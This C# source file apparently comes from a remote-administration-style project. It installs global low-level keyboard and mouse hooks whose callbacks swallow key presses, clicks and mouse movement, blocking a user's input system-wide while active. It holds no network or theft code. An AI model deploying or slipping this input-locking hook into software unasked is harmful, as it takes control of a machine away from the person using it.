using System;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace NativeAPI
{
	public static class Hook
	{
		public class KeyBoardHooking
		{
			private const short WM_KEYDOWN = 0x100;
			private const int WM_SYSKEYDOWN = 0x104;

			[StructLayout(LayoutKind.Sequential)]
			protected struct KBDLLHOOKSTRUCT
			{
				public Keys key;
				public int scanCode;
				public int flags;
				public int time;
				public IntPtr extra;
			}

			public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
			protected static IntPtr ptrHook;
			protected static LowLevelKeyboardProc callback;

			public void AbortHook() 
			{
				try
				{
					if (ptrHook != IntPtr.Zero)
						Miscellaneous.UnhookWindowsHookEx(ptrHook);
				}
				catch{ }
			}
			public void HookKeyboard()
			{
				callback = new LowLevelKeyboardProc(BlockKey);
				ptrHook = Miscellaneous.SetWindowsHookEx(13, callback, System.Diagnostics.Process.GetCurrentProcess().MainModule.BaseAddress, 0);
			}

			protected static IntPtr BlockKey(int nCode, IntPtr wp, IntPtr lp)
			{
                try
                {
					if (nCode >= 0)
					{

						if (wp == (System.IntPtr)0x100)
						{
							return wp;
						}

						if (wp == (System.IntPtr)0x101)
						{
							return wp;
						}

						if (wp == (System.IntPtr)0x105)
						{
							return wp;
						}

						if (wp == (System.IntPtr)0x104)
						{
							return wp;
						}
					}
					else
					{

					}
					return IntPtr.Zero;

				}
                catch {}
				return IntPtr.Zero;
			}
		}

		public class MouseHooking 
		{
			[StructLayout(LayoutKind.Sequential)]
			protected struct MSLLHOOKSTRUCT
			{
				public Point pt;
				public int mouseData;
				public int flags;
				public int time;
				public IntPtr extra;
			}
			protected static IntPtr ptrHook;
			public delegate IntPtr LowLevelMouseProc(int nCode, IntPtr wParam, IntPtr lParam);
			protected static LowLevelMouseProc callback;

			public void AbortHook()
			{
				try
				{
					if (ptrHook != IntPtr.Zero)
						Miscellaneous.UnhookWindowsHookEx(ptrHook);
				}
				catch { }
			}
			public void HookMouse()
			{
				callback = new LowLevelMouseProc(BlockKey);
				ptrHook = Miscellaneous.SetWindowsHookEx(14, callback, System.Diagnostics.Process.GetCurrentProcess().MainModule.BaseAddress, 0);
			}

			protected static IntPtr BlockKey(int nCode, IntPtr wp, IntPtr lp)
			{
                try
                {
					if (nCode >= 0)
					{
						MSLLHOOKSTRUCT objKeyInfo = (MSLLHOOKSTRUCT)Marshal.PtrToStructure(lp, typeof(MSLLHOOKSTRUCT));
						if (wp == (System.IntPtr)0x201) //WM_LBUTTONDOWN
						{
							return wp;
						}
						if (wp == (System.IntPtr)0x202) //WM_LBUTTONUP
						{
							return wp;
						}
						if (wp == (System.IntPtr)0x203) //'LEFT DB CLICK
						{
							return wp;
						}
						//0x0203
						if (wp == (System.IntPtr)0x204) //'WM_RBUTTONDOWN
						{
							return wp;
						}
						if (wp == (System.IntPtr)0x205) //'WM_RBUTTONUP
						{
							return wp;
						}
						if (wp == (System.IntPtr)0x206) //' WM_RBUTTONDBLCLK
						{
							return wp;
						}
						if (wp == (System.IntPtr)0x200) //' MOUSE MOVE
						{
							return wp;
						}
					}
					else
					{

					}
					return IntPtr.Zero;
				}
                catch {}

				return IntPtr.Zero;
			}
		}
	}
}
